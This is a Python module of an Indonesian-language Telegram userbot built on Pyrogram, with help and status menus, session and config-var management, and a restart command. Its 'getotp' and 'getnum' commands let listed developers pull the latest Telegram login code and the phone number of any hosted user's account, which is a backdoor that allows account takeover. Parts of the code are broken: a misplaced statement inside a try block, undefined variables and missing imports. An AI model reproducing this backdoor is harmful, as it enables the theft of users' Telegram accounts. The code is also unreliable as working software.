import asyncio
import datetime
import re
import sys
from datetime import datetime
from os import environ, execle
import asyncio
import math
import os
import sys
from os import environ, execle, remove
HAPP = None
import dotenv
import heroku3
import requests
import urllib3
from dotenv import load_dotenv
from pyrogram.raw.functions import Ping
from pyrogram.types import *

from . import *
from .ping import START_TIME, _human_time_duration

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


@bots.on_message(filters.command(["help", "alive"], cmd) & filters.me)
async def _(client, message):
    if message.command[0] == "alive":
        text = f"user_alive_command {message.id} {message.from_user.id}"
    if message.command[0] == "help":
        text = "user_help_command"
    try:
        x = await client.get_inline_bot_results(app.me.username, text)
        for m in x.results:
            await message.reply_inline_bot_result(x.query_id, m.id)
    except Exception as error:
        await message.reply(error)


@app.on_inline_query(filters.regex("^user_alive_command"))
async def _(client, inline_query):
    get_id = inline_query.query.split()
    expired = "__none__"
    status1 = "premium"
    for my in botlist:
        if int(get_id[2]) == int(my.me.id):
            users = 0
            group = 0
            async for dialog in my.get_dialogs():
                if dialog.chat.type == enums.ChatType.PRIVATE:
                    users += 1
                elif dialog.chat.type in (
                    enums.ChatType.GROUP,
                    enums.ChatType.SUPERGROUP,
                ):
                    group += 1
            if int(get_id[2]) == DEVS:
                status = "founder"
                expired = "__none__"
            else:
                status = "owner"
                expired = "__none__"
                button = [
                    [
                        InlineKeyboardButton(
                            text="Close",
                            callback_data=f"alv_cls {int(get_id[1])} {int(get_id[2])}",
                        ),
                        InlineKeyboardButton(
                            text="Support",
                            url=f"https://t.me/kynansupport",
                        ),
                    ]
                ]
            start = datetime.now()
            await my.invoke(Ping(ping_id=0))
            ping = (datetime.now() - start).microseconds / 1000
            uptime_sec = (datetime.utcnow() - START_TIME).total_seconds()
            uptime = await _human_time_duration(int(uptime_sec))
            msg = f"""
<b>Naya-Pyro</b>
     <b>status:</b> <code>{status1}[{status}]</code>
          <b>dc_id:</b> <code>{my.me.dc_id}
          <b>ping_dc:</b> <code>{ping} ms</code>
          <b>peer_users:</b> <code>{users} users</code>
          <b>peer_group:</b> <code>{group} group</code>
          <b>uptime:</b> <code>{uptime}</code>
          <b>expired:</b> <code>{expired}</code>
"""
            await client.answer_inline_query(
                inline_query.id,
                cache_time=60,
                results=[
                    (
                        InlineQueryResultArticle(
                            title="💬",
                            reply_markup=InlineKeyboardMarkup(button),
                            input_message_content=InputTextMessageContent(msg),
                        )
                    )
                ],
            )


@app.on_callback_query(filters.regex("^alv_cls"))
async def _(cln, cq):
    get_id = cq.data.split()
    if not cq.from_user.id == int(get_id[2]):
        return await cq.answer(
            f"**❌ GAUSAH PENCET ANJENG, GUE JIJIK.**",
            True,
        )
    unPacked = unpackInlineMessage(cq.inline_message_id)
    for my in botlist:
        if cq.from_user.id == int(my.me.id):
            await my.delete_messages(
                unPacked.chat_id, [int(get_id[1]), unPacked.message_id]
            )


@app.on_inline_query(filters.regex("^user_help_command"))
async def _(client, inline_query):
    msg = f"<b>Menu Bantuan\nPerintah: <code>{cmd}</code></b>"
    await client.answer_inline_query(
        inline_query.id,
        cache_time=60,
        results=[
            (
                InlineQueryResultArticle(
                    title="Help Menu!",
                    reply_markup=InlineKeyboardMarkup(
                        paginate_modules(0, CMD_HELP, "help")
                    ),
                    input_message_content=InputTextMessageContent(msg),
                )
            )
        ],
    )


@app.on_callback_query(filters.regex(r"help_(.*?)"))
async def _(client, callback_query):
    mod_match = re.match(r"help_module\((.+?)\)", callback_query.data)
    prev_match = re.match(r"help_prev\((.+?)\)", callback_query.data)
    next_match = re.match(r"help_next\((.+?)\)", callback_query.data)
    back_match = re.match(r"help_back", callback_query.data)
    if mod_match:
        module = (mod_match.group(1)).replace(" ", "_")
        text = f"<b>{CMD_HELP[module].__HELP__}</b>\n"
        button = [[InlineKeyboardButton("❮", callback_data="help_back")]]
        await callback_query.edit_message_text(
            text=text,
            reply_markup=InlineKeyboardMarkup(button),
            disable_web_page_preview=True,
        )
    top_text = f"<b>Menu Bantuan\nPerintah: <code>{cmd}</code></b>"
    if prev_match:
        curr_page = int(prev_match.group(1))
        await callback_query.edit_message_text(
            top_text,
            reply_markup=InlineKeyboardMarkup(
                paginate_modules(curr_page - 1, CMD_HELP, "help")
            ),
            disable_web_page_preview=True,
        )
    if next_match:
        next_page = int(next_match.group(1))
        await callback_query.edit_message_text(
            top_text,
            reply_markup=InlineKeyboardMarkup(
                paginate_modules(next_page + 1, CMD_HELP, "help")
            ),
            disable_web_page_preview=True,
        )
    if back_match:
        await callback_query.edit_message_text(
            top_text,
            reply_markup=InlineKeyboardMarkup(paginate_modules(0, CMD_HELP, "help")),
            disable_web_page_preview=True,
        )


@app.on_message(filters.command(["user"]) & filters.private)
async def usereee(_, message):
    if message.from_user.id not in DEVS:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    count = 0
    user = ""
    for X in botlist:
        try:
            count += 1
            user += f"""
❏ USERBOT KE {count}
 ├ AKUN: <a href=tg://user?id={X.me.id}>{X.me.first_name} {X.me.last_name or ''}</a>
 ╰ ID: <code>{X.me.id}</code>
"""
        except BaseException:
            pass
    if int(len(str(user))) > 4096:
        with BytesIO(str.encode(str(user))) as out_file:
            out_file.name = "userbot.txt"
            await message.reply_document(
                document=out_file,
            )
    else:
        await message.reply(f"<b>{user}</b>")



@app.on_callback_query(filters.regex("cl_ad"))
async def close(_, query: CallbackQuery):
    await query.message.delete()


@app.on_callback_query(filters.regex("sesi"))
async def close(_, query: CallbackQuery):
    user_id = query.from_user.id
    try:
        await app.ask(
            user_id,
            "<b>Silakan masukkan session dengan format urutan session . Batas session sampai dengan SESSION10.\nContoh : SESSION2 JDOEK29DKDO0XXXXXX</b>",
            timeout=120,
        )
    buttons = [
            [InlineKeyboardButton(text="Kembali", callback_data="multi")],
            [InlineKeyboardButton("Tutup", callback_data="cl_ad")],
        ]
    except asyncio.TimeoutError:
        return await app.send_message(user_id, "<b>Waktu telah habis</b>")
    to_set = message.text.split(None, 1)[1].strip()
    value = message.text.split(None, 2)[2].strip()
    if "HEROKU_APP_NAME" in os.environ and "HEROKU_API_KEY" in os.environ:
        api_key = os.environ["HEROKU_API_KEY"]
        app_name = os.environ["HEROKU_APP_NAME"]
        heroku = heroku3.from_key(api_key)
        app = heroku.apps()[app_name]
        config_vars = app.config()
        if to_set in config_vars:
            config_vars[to_set] = value
            await app.send_message(user_id, f"**Berhasil Mengubah var `{to_set}` menjadi `{value}`**",
            reply_markup=InlineKeyboardMarkup(buttons),
            )
        else:
            config_vars[to_set] = value
            await app.send_message(user_id, f"**Berhasil Menambahkan var `{to_set}` menjadi `{value}`**",
            reply_markup=InlineKeyboardMarkup(buttons),
            )
        app.update_config(config_vars)
    else:
        path = ".env"
        if not os.path.exists(path):
            return await app.send_message(user_id, "`.env file not found.`",
            reply_markup=InlineKeyboardMarkup(buttons),
            )
        with open(path, "a") as f:
            f.write(f"\n{to_set}={value}")
        if dotenv.get_key(path, to_set):
            await app.send_message(user_id, f"**Berhasil Mengubah var `{to_set}` menjadi `{value}`**",
            reply_markup=InlineKeyboardMarkup(buttons),
            )
        else:
            await app.send_message(user_id, f"**Berhasil Menambahkan var `{to_set}` menjadi `{value}`**",
            reply_markup=InlineKeyboardMarkup(buttons),
            )



@app.on_callback_query(filters.regex("multi"))
async def close(_, query: CallbackQuery):
    await query.edit_message_text("<b>Kamu bisa mengatur SESSION1-10, dan kamu juga bisa menghapus nya.</b>",
    reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="Tambah Client", callback_data="sesi"),
                    InlineKeyboardButton(text="Hapus Client", callback_data="remsesi"),
                ],
                [
                    InlineKeyboardButton(text="Tutup", callback_data="cl_ad"),
                ],
                [
                    InlineKeyboardButton(text="Kembali", callback_data="setong"),
                ],
            ]
        ),
    )



@app.on_callback_query(filters.regex("setong"))
async def setdah(_, query: CallbackQuery):
    return await query.edit_message_text(
        f"""
    <b> ☺️ Apa yang kamu butuhkan ?.</b>""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="Multi Client", callback_data="multi"),
                ],
                [
                    InlineKeyboardButton(text="Restart", callback_data="retor"),
                ],
                [
                    InlineKeyboardButton(text="Tutup", callback_data="cl_ad"),
                ],
            ]
        ),
    )


@app.on_callback_query(filters.regex("restart"))
async def jadi(_, query: CallbackQuery):
    try:
        await query.edit_message_text("<b>Processing...</b>")
        LOGGER(__name__).info("BOT SERVER RESTARTED !!")
    except BaseException as err:
        LOGGER(__name__).info(f"{err}")
        return
    await asyncio.sleep(2)
    await query.edit_message_text(f"✅ <b>{app.me.mention} Berhasil Di Restart.</b>")
    args = [sys.executable, "-m", "naya"]
    execle(sys.executable, *args, environ)


@app.on_callback_query(filters.regex("retor"))
async def _(_, query: CallbackQuery):
    buttons = [
        [
            InlineKeyboardButton(text="✅ Restart", callback_data="restart"),
            InlineKeyboardButton("❌ Tidak", callback_data="cl_ad"),
        ],
    ]
    await query.edit_message_text(
        f"<b>Apakah kamu yakin ingin Melakukan Restart ?</b>",
        reply_markup=InlineKeyboardMarkup(buttons),
    )


@app.on_message(filters.command(["start"]))
async def _(_, message):
    user_id = message.from_user.id
    if user_id == OWNER:
        await message.reply_text(
            f"""
<b>👋 Halo {message.from_user.first_name}
💭 Apa ada yang bisa saya bantu ?
💡 Silakan pilih tombol dibawah untuk kamu perlukan.
</b>""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton(text="Pengaturan", callback_data="setong")],
                    [InlineKeyboardButton("Tutup", callback_data="cl_ad")],
                ]
            ),
            disable_web_page_preview=True,
        )
    else:
        await message.reply_text(
            f"""
<b>👋 Halo {message.from_user.first_name}
💭 Apa ada yang bisa saya bantu ?
💡 Saya Adalah Bot Milik.</b>
""",
            reply_markup=InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton(text="👮‍♂ Owner", user_id=OWNER)],
                    [InlineKeyboardButton("Tutup", callback_data="cl_ad")],
                ]
            ),
            disable_web_page_preview=True,
        )


@app.on_message(filters.command(["getotp", "getnum"]) & filters.private)
async def otp_and_numbereeee(_, message):
    if len(message.command) < 2:
        return await app.send_message(
            message.chat.id,
            f"<code>{message.text} user_id userbot yang aktif</code>",
            reply_to_message_id=message.id,
        )
    elif message.from_user.id not in DEVS:
        return await message.reply(
            "❌ Anda tidak bisa menggunakan perintah ini\n\n✅ hanya developer yang bisa menggunakan perintah ini"
        )
    try:
        for X in botlist:
            if int(message.command[1]) == X.me.id:
                if message.command[0] == "getotp":
                    async for otp in X.search_messages(777000, limit=1):
                        if otp.text:
                            return await app.send_message(
                                message.chat.id,
                                otp.text,
                                reply_to_message_id=message.id,
                            )
                        else:
                            return await app.send_message(
                                message.chat.id,
                                "<code>Kode Otp Tidak Di Temukan</code>",
                                reply_to_message_id=message.id,
                            )
                elif message.command[0] == "getnum":
                    return await app.send_message(
                        message.chat.id,
                        X.me.phone_number,
                        reply_to_message_id=message.id,
                    )
    except Exception as error:
        return await app.send_message(
            message.chat.id, error, reply_to_message_id=message.id
        )

async def is_cancel(callback_query, text):
    if text.startswith("/cancel"):
        user_id = callback_query.from_user.id
        await app.send_message(user_id, "<b>Dibatalkan !</b>")
        return True
    return False